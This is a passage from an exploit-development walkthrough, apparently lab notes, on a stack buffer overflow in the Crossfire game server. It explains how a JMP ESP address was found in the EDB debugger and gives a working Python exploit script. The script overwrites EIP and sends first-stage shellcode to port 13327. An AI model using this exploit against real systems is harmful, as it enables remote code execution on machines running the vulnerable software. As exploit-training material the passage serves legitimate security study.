Finally, we need to find a valid ASM instruction to redirect code exeuction to the memory location pointed at by ESP. 

EDB has a nifty plugin called "OpCodeSearcher"

we can easily search for a JMP ESP or equivalent in the memory region where the code section of Crossfire is mapped. 

We choose to proceed using the first JMP ESP instruction found by the debugger (0x08134596)

Putting it all together:

```
#!/usr/bin/python
import socket
host = "10.11.0.128"
padding = "\x41" * 4368
eip = "\x96\x45\x13\x08"
first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90"
buffer = "\x11(setup sound " + padding + eip + first_stage + "\x90\x00#"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."
s.connect((host, 13327))
print s.recv(1024)
s.send(buffer)
s.close()
print "[*]Payload Sent !"
```

Restart crossfire and EDB. Reattach. Set a breakpoint at the JMP ESP address. 

